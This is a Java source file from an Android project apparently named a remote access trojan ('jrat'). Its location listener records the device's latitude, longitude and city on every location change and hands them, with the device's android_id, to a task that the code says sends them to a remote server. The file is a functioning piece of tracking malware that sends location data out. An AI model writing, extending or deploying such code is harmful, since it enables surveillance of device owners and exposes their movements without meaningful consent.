package com.julioxus.jrat;

import android.content.Context;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.widget.Toast;

import java.io.IOException;
import java.util.List;
import java.util.Locale;

/**
 * Created by julioxus on 13/03/16.
 */
public class MyLocationListener implements LocationListener {

    Context context;
    String android_id;

    MyLocationListener(Context context, String android_id){
        this.context = context;
        this.android_id = android_id;

    }

    //Handler that will execute each time that the location of the user changes
    @Override
    public void onLocationChanged(Location loc) {
        Toast.makeText(
                context,
                "Location changed: Lat: " + loc.getLatitude() + " Lng: "
                        + loc.getLongitude(), Toast.LENGTH_SHORT).show();
        String longitude = "Longitude: " + loc.getLongitude();
        String latitude = "Latitude: " + loc.getLatitude();

        /*------- To get city name from coordinates -------- */
        String cityName = null;
        Geocoder gcd = new Geocoder(context, Locale.getDefault());
        List<Address> addresses;
        try {
            addresses = gcd.getFromLocation(loc.getLatitude(),
                    loc.getLongitude(), 1);
            if (addresses.size() > 0) {
                System.out.println(addresses.get(0).getLocality());
                cityName = addresses.get(0).getLocality();
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        String s = longitude + "\n" + latitude + "\n\nMy Current City is: "
                + cityName;

        //Send location data to the remote server
        new SendGeoLocationAsyncTask(context, android_id, latitude,longitude, cityName).execute();
    }

    @Override
    public void onProviderDisabled(String provider) {}

    @Override
    public void onProviderEnabled(String provider) {}

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {}
}
